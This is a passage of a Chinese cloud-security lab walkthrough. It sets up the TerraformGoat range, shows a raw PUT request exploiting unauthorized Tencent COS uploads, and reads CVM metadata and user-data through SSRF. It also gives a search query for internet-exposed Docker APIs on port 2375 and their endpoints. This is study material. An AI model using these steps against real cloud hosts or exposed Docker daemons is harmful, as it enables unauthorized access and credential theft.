+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="err">#</span><span class="n">卸载</span><span class="w"> </span><span class="n">Docker引擎</span><span class="o">/</span><span class="n">CLI</span><span class="o">/</span><span class="n">Containerd软件包</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">yum</span><span class="w"> </span><span class="n">remove</span><span class="w"> </span><span class="n">docker</span><span class="o">-</span><span class="n">ce</span><span class="w"> </span><span class="n">docker</span><span class="o">-</span><span class="n">ce</span><span class="o">-</span><span class="n">cli</span><span class="w"> </span><span class="n">containerd</span><span class="p">.</span><span class="na">io</span><span class="w">      
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="err">#</span><span class="n">查找出docker的相关文件夹</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">find</span><span class="w"> </span><span class="o">-</span><span class="n">name</span><span class="w"> </span><span class="err">&#39;</span><span class="n">docker</span><span class="err">&#39;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="err">#</span><span class="n">rm</span><span class="w"> </span><span class="o">-</span><span class="n">rf</span><span class="w"> </span><span class="n">删除这些文件夹</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">rm</span><span class="w"> </span><span class="o">-</span><span class="n">rf</span><span class="w"> </span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">docker</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">rm</span><span class="w"> </span><span class="o">-</span><span class="n">rf</span><span class="w"> </span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">containerd</span><span class="w"> 
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="err">#</span><span class="n">安装所需的软件包</span><span class="err">。</span><span class="n">yum</span><span class="o">-</span><span class="n">utils</span><span class="w"> </span><span class="n">提供了</span><span class="w"> </span><span class="n">yum</span><span class="o">-</span><span class="n">config</span><span class="o">-</span><span class="n">manager</span><span class="w"> </span><span class="err">，</span><span class="n">并且</span><span class="w"> </span><span class="n">device</span><span class="w"> </span><span class="n">mapper</span><span class="w"> </span><span class="n">存储驱动程序需要</span><span class="w"> </span><span class="n">device</span><span class="o">-</span><span class="n">mapper</span><span class="o">-</span><span class="n">persistent</span><span class="o">-</span><span class="n">data</span><span class="w"> </span><span class="n">和</span><span class="w"> </span><span class="n">lvm2</span><span class="err">。</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">yum</span><span class="w"> </span><span class="n">install</span><span class="w"> </span><span class="o">-</span><span class="n">y</span><span class="w"> </span><span class="n">yum</span><span class="o">-</span><span class="n">utils</span><span class="w"> </span><span class="n">device</span><span class="o">-</span><span class="n">mapper</span><span class="o">-</span><span class="n">persistent</span><span class="o">-</span><span class="n">data</span><span class="w"> </span><span class="n">lvm2</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="err">#</span><span class="n">设置仓库为阿里源</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">yum</span><span class="o">-</span><span class="n">config</span><span class="o">-</span><span class="n">manager</span><span class="w"> </span><span class="o">--</span><span class="n">add</span><span class="o">-</span><span class="n">repo</span><span class="w"> </span><span class="n">http</span><span class="p">:</span><span class="c1">//mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">或者</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">wget</span><span class="w"> </span><span class="n">http</span><span class="p">:</span><span class="c1">//mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">cp</span><span class="w"> </span><span class="n">docker</span><span class="o">-</span><span class="n">ce</span><span class="p">.</span><span class="na">repo</span><span class="w"> </span><span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">yum</span><span class="p">.</span><span class="na">repos</span><span class="p">.</span><span class="na">d</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="err">#</span><span class="n">更新源</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">yum</span><span class="w"> </span><span class="n">clean</span><span class="w"> </span><span class="n">all</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="n">yum</span><span class="w"> </span><span class="n">mackecache</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="err">#</span><span class="n">默认安装</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">yum</span><span class="w"> </span><span class="n">install</span><span class="w"> </span><span class="n">docker</span><span class="o">-</span><span class="n">ce</span><span class="w"> </span><span class="n">docker</span><span class="o">-</span><span class="n">ce</span><span class="o">-</span><span class="n">cli</span><span class="w"> </span><span class="n">containerd</span><span class="p">.</span><span class="na">io</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="err">#</span><span class="n">启动和查看</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">systemctl</span><span class="w"> </span><span class="n">start</span><span class="w"> </span><span class="n">docker</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">systemctl</span><span class="w"> </span><span class="n">status</span><span class="w"> </span><span class="n">docker</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">docker</span><span class="w"> </span><span class="o">--</span><span class="n">version</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">docker</span><span class="w"> </span><span class="n">info</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="22启动项目">2.2.启动项目
+</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">docker</span><span class="w"> </span><span class="n">pull</span><span class="w"> </span><span class="n">registry</span><span class="p">.</span><span class="na">cn</span><span class="o">-</span><span class="n">hongkong</span><span class="p">.</span><span class="na">aliyuncs</span><span class="p">.</span><span class="na">com</span><span class="o">/</span><span class="n">huoxian_pub</span><span class="o">/</span><span class="n">terraformgoat_tencentcloud</span><span class="p">:</span><span class="n">0</span><span class="p">.</span><span class="na">0</span><span class="p">.</span><span class="na">7</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">docker</span><span class="w"> </span><span class="n">run</span><span class="w"> </span><span class="o">-</span><span class="n">itd</span><span class="w"> </span><span class="o">--</span><span class="n">name</span><span class="w"> </span><span class="n">terraformgoat_tencentcloud_0</span><span class="p">.</span><span class="na">0</span><span class="p">.</span><span class="na">7</span><span class="w"> </span><span class="n">registry</span><span class="p">.</span><span class="na">cn</span><span class="o">-</span><span class="n">hongkong</span><span class="p">.</span><span class="na">aliyuncs</span><span class="p">.</span><span class="na">com</span><span class="o">/</span><span class="n">huoxian_pub</span><span class="o">/</span><span class="n">terraformgoat_tencentcloud</span><span class="p">:</span><span class="n">0</span><span class="p">.</span><span class="na">0</span><span class="p">.</span><span class="na">7</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">docker</span><span class="w"> </span><span class="n">exec</span><span class="w"> </span><span class="o">-</span><span class="n">it</span><span class="w"> </span><span class="n">terraformgoat_tencentcloud_0</span><span class="p">.</span><span class="na">0</span><span class="p">.</span><span class="na">7</span><span class="w"> </span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">bash</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="23开启靶机">2.3.开启靶机
+</h3><p><a class="link" href="https://wiki.teamssix.com/CloudNative/Terraform/"  target="_blank" rel="noopener"
+    >Terraform 介绍与安装 | T Wiki</a></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="err">#</span><span class="n">例如在腾讯云存储桶Cos上开启未授权上传任意文件靶机</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">cd</span><span class="w"> </span><span class="n">cos</span><span class="o">/</span><span class="n">unrestricted_file_upload</span><span class="o">/</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="err">#</span><span class="n">编辑配置文件</span><span class="err">，</span><span class="n">将AK</span><span class="o">/</span><span class="n">SK密钥填入其中</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">cat</span><span class="w"> </span><span class="n">terraform</span><span class="p">.</span><span class="na">tfvars</span><span class="w">           </span><span class="c1">//        tencent configure</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">terraform</span><span class="w"> </span><span class="n">init</span><span class="w">          </span><span class="c1">//初始化靶场</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">terraform</span><span class="w"> </span><span class="n">apply</span><span class="w">         </span><span class="c1">//运行靶场，会创建一个全新的bucket</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/%E4%BA%91%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image/17.png"
+	width="2336"
+	height="775"
+	srcset="/p/%E4%BA%91%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image/17_hu_49ee27f2ff2efc10.png 480w, /p/%E4%BA%91%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image/17_hu_75b8b8f4487d421f.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="301"
+		data-flex-basis="723px"
+	
+></p>
+<p><img src="/p/%E4%BA%91%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image/18.png"
+	width="1166"
+	height="742"
+	srcset="/p/%E4%BA%91%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image/18_hu_9d121c1c63e264d8.png 480w, /p/%E4%BA%91%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image/18_hu_bf83efe1d2def52e.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="157"
+		data-flex-basis="377px"
+	
+></p>
+<h3 id="24复现漏洞">2.4.复现漏洞
+</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">PUT</span><span class="w"> </span><span class="o">/</span><span class="n">test</span><span class="p">.</span><span class="na">txt</span><span class="w"> </span><span class="n">HTTP</span><span class="o">/</span><span class="n">1</span><span class="p">.</span><span class="na">1</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nl">Host</span><span class="p">:</span><span class="w"> </span><span class="n">hxlab</span><span class="o">-</span><span class="n">1xmqj</span><span class="o">-</span><span class="n">1316547049</span><span class="p">.</span><span class="na">cos</span><span class="p">.</span><span class="na">ap</span><span class="o">-</span><span class="n">beijing</span><span class="p">.</span><span class="na">myqcloud</span><span class="p">.</span><span class="na">com</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">User</span><span class="o">-</span><span class="n">Agent</span><span class="p">:</span><span class="w"> </span><span class="n">Mozilla</span><span class="o">/</span><span class="n">5</span><span class="p">.</span><span class="na">0</span><span class="w"> </span><span class="p">(</span><span class="n">Windows</span><span class="w"> </span><span class="n">NT</span><span class="w"> </span><span class="n">10</span><span class="p">.</span><span class="na">0</span><span class="p">;</span><span class="w"> </span><span class="n">Win64</span><span class="p">;</span><span class="w"> </span><span class="n">x64</span><span class="p">;</span><span class="w"> </span><span class="n">rv</span><span class="p">:</span><span class="n">136</span><span class="p">.</span><span class="na">0</span><span class="p">)</span><span class="w"> </span><span class="n">Gecko</span><span class="o">/</span><span class="n">20100101</span><span class="w"> </span><span class="n">Firefox</span><span class="o">/</span><span class="n">136</span><span class="p">.</span><span class="na">0</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nl">Accept</span><span class="p">:</span><span class="w"> </span><span class="n">text</span><span class="o">/</span><span class="n">html</span><span class="p">,</span><span class="n">application</span><span class="o">/</span><span class="n">xhtml</span><span class="o">+</span><span class="n">xml</span><span class="p">,</span><span class="n">application</span><span class="o">/</span><span class="n">xml</span><span class="p">;</span><span class="n">q</span><span class="o">=</span><span class="n">0</span><span class="p">.</span><span class="na">9</span><span class="p">,</span><span class="o">*/*</span><span class="p">;</span><span class="n">q</span><span class="o">=</span><span class="n">0</span><span class="p">.</span><span class="na">8</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Accept</span><span class="o">-</span><span class="n">Language</span><span class="p">:</span><span class="w"> </span><span class="n">zh</span><span class="o">-</span><span class="n">CN</span><span class="p">,</span><span class="n">zh</span><span class="p">;</span><span class="n">q</span><span class="o">=</span><span class="n">0</span><span class="p">.</span><span class="na">8</span><span class="p">,</span><span class="n">zh</span><span class="o">-</span><span class="n">TW</span><span class="p">;</span><span class="n">q</span><span class="o">=</span><span class="n">0</span><span class="p">.</span><span class="na">7</span><span class="p">,</span><span class="n">zh</span><span class="o">-</span><span class="n">HK</span><span class="p">;</span><span class="n">q</span><span class="o">=</span><span class="n">0</span><span class="p">.</span><span class="na">5</span><span class="p">,</span><span class="n">en</span><span class="o">-</span><span class="n">US</span><span class="p">;</span><span class="n">q</span><span class="o">=</span><span class="n">0</span><span class="p">.</span><span class="na">3</span><span class="p">,</span><span class="n">en</span><span class="p">;</span><span class="n">q</span><span class="o">=</span><span class="n">0</span><span class="p">.</span><span class="na">2</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Accept</span><span class="o">-</span><span class="n">Encoding</span><span class="p">:</span><span class="w"> </span><span class="n">gzip</span><span class="p">,</span><span class="w"> </span><span class="n">deflate</span><span class="p">,</span><span class="w"> </span><span class="n">br</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Upgrade</span><span class="o">-</span><span class="n">Insecure</span><span class="o">-</span><span class="n">Requests</span><span class="p">:</span><span class="w"> </span><span class="n">1</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Sec</span><span class="o">-</span><span class="n">Fetch</span><span class="o">-</span><span class="n">Dest</span><span class="p">:</span><span class="w"> </span><span class="n">document</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Sec</span><span class="o">-</span><span class="n">Fetch</span><span class="o">-</span><span class="n">Mode</span><span class="p">:</span><span class="w"> </span><span class="n">navigate</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Sec</span><span class="o">-</span><span class="n">Fetch</span><span class="o">-</span><span class="n">Site</span><span class="p">:</span><span class="w"> </span><span class="n">none</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Sec</span><span class="o">-</span><span class="n">Fetch</span><span class="o">-</span><span class="n">User</span><span class="p">:</span><span class="w"> </span><span class="o">?</span><span class="n">1</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nl">Priority</span><span class="p">:</span><span class="w"> </span><span class="n">u</span><span class="o">=</span><span class="n">0</span><span class="p">,</span><span class="w"> </span><span class="n">i</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nl">Te</span><span class="p">:</span><span class="w"> </span><span class="n">trailers</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nl">Connection</span><span class="p">:</span><span class="w"> </span><span class="n">close</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Content</span><span class="o">-</span><span class="n">Length</span><span class="p">:</span><span class="w"> </span><span class="n">9</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">111222333</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/%E4%BA%91%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image/19.png"
+	width="2436"
+	height="884"
+	srcset="/p/%E4%BA%91%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image/19_hu_cbc98c0d36ecbcee.png 480w, /p/%E4%BA%91%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image/19_hu_676225a24a465b9.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="275"
+		data-flex-basis="661px"
+	
+></p>
+<h3 id="25关闭靶机">2.5.关闭靶机
+</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">terraform</span><span class="w"> </span><span class="n">destroy</span><span class="w">            </span><span class="c1">//销毁环境</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">注意</span><span class="err">：</span><span class="n">现在腾讯云存储桶COs中如果存在文件不能直接销毁</span><span class="err">，</span><span class="n">需要先清空里面文件才能销毁成功</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="3弹性计算服务漏洞">3.弹性计算服务漏洞
+</h2><p><a class="link" href="https://mp.weixin.qq.com/s/JDcwVxaE1ni9NYMAFkZQaw"  target="_blank" rel="noopener"
+    >云安全(三)：弹性计算</a></p>
+<h3 id="31腾讯云-cvm-ssrf漏洞">3.1.腾讯云 CVM SSRF漏洞
+</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">terraform</span><span class="w"> </span><span class="n">init</span><span class="w">          </span><span class="c1">//初始化靶场</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">terraform</span><span class="w"> </span><span class="n">apply</span><span class="w">         </span><span class="c1">//运行靶场，会创建一个全新的bucket</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>运行后会开启一个靶场，这个需要自己购买服务器，需要钱</strong></p>
+<p><img src="/p/%E4%BA%91%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image/20.png"
+	width="2046"
+	height="877"
+	srcset="/p/%E4%BA%91%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image/20_hu_bd31ab0244e63977.png 480w, /p/%E4%BA%91%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image/20_hu_bd4998d189ca02d8.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="233"
+		data-flex-basis="559px"
+	
+></p>
+<p><strong>输入网址发送请求服务器会发送请求到Dnslog地址</strong></p>
+<p><img src="/p/%E4%BA%91%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image/21.png"
+	width="2426"
+	height="942"
+	srcset="/p/%E4%BA%91%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image/21_hu_656db1109f8bff5d.png 480w, /p/%E4%BA%91%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image/21_hu_c931e2850cd0b80c.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="257"
+		data-flex-basis="618px"
+	
+></p>
+<p><strong>先判断ip是不是云服务器ip</strong></p>
+<p><img src="/p/%E4%BA%91%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image/22.png"
+	width="2084"
+	height="889"
+	srcset="/p/%E4%BA%91%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image/22_hu_93f2ddc20ce84ef5.png 480w, /p/%E4%BA%91%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image/22_hu_71a3153f6ee3362d.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="234"
+		data-flex-basis="562px"
+	
+></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">读取元数据</span><span class="w"> </span><span class="n">http</span><span class="p">:</span><span class="c1">//metadata.tencentyun.com/latest/meta-data/</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/%E4%BA%91%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image/23.png"
+	width="1099"
+	height="908"
+	srcset="/p/%E4%BA%91%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image/23_hu_6361bc5419159a20.png 480w, /p/%E4%BA%91%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image/23_hu_25ea0bc6b74cc567.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="121"
+		data-flex-basis="290px"
+	
+></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">读取用户数据</span><span class="err">：</span><span class="n">http</span><span class="p">:</span><span class="c1">//metadata.tencentyun.com/latest/user-data/</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/%E4%BA%91%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image/24.png"
+	width="1226"
+	height="600"
+	srcset="/p/%E4%BA%91%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image/24_hu_9d5ee9640be0efce.png 480w, /p/%E4%BA%91%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image/24_hu_ebbe1df249a42192.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="204"
+		data-flex-basis="490px"
+	
+></p>
+<p><strong>查看flag</strong></p>
+<h2 id="4k8s常见漏洞">4.K8S常见漏洞
+</h2><p><a class="link" href="https://mp.weixin.qq.com/s/aosHcmnMDALqpc0usEvvzw"  target="_blank" rel="noopener"
+    >【云原生安全】K8s安全漏洞复现</a></p>
+<h1 id="5docker常见漏洞">5.Docker常见漏洞
+</h1><p><a class="link" href="https://mp.weixin.qq.com/s/tdL2E501k2EhfJ4WurVd4Q"  target="_blank" rel="noopener"
+    >手把手搭建 k8s docker 漏洞环境</a></p>
+<p><a class="link" href="https://mp.weixin.qq.com/s/bzIAQK4_CuSZcfsX6r6FSg"  target="_blank" rel="noopener"
+    >【云安全】云原生-Docker（五）容器逃逸之漏洞利用</a></p>
+<h2 id="51docker未授权漏洞">5.1.Docker未授权漏洞
+</h2><p><a class="link" href="https://mp.weixin.qq.com/s/Smzz-1wcxG47EKiRnFWlZg"  target="_blank" rel="noopener"
+    >『漏洞复现』Docker 未授权漏洞</a></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">搜索语法</span><span class="err">：</span><span class="n">port</span><span class="p">:</span><span class="s">&#34;2375&#34;</span><span class="w"> </span><span class="n">AND</span><span class="w"> </span><span class="n">service</span><span class="p">:</span><span class="w"> </span><span class="s">&#34;docker&#34;</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="511查看版本接口">5.1.1.查看版本接口
+</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="nl">http</span><span class="p">:</span><span class="c1">//ip:2375/version</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/%E4%BA%91%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image/25.png"
+	width="1622"
+	height="851"
+	srcset="/p/%E4%BA%91%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image/25_hu_9b5a049fe81deaf4.png 480w, /p/%E4%BA%91%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image/25_hu_6b569720b2e11c88.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="190"
+		data-flex-basis="457px"
+	
+></p>
+<h3 id="512查看info目录">5.1.2.查看info目录
+</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="nl">http</span><span class="p">:</span><span class="c1">//ip:2375/info</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/%E4%BA%91%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image/26.png"
+	width="1586"
+	height="775"
+	srcset="/p/%E4%BA%91%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image/26_hu_e9b33defb155e73e.png 480w, /p/%E4%BA%91%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image/26_hu_d4dcea275cc8c02.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="204"
+		data-flex-basis="491px"
+	
+></p>
+<h3 id="513查看image镜像">5.1.3.查看image镜像
+</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="nl">http</span><span class="p">:</span><span class="c1">//ip:2375/images/json</span><span class="w">
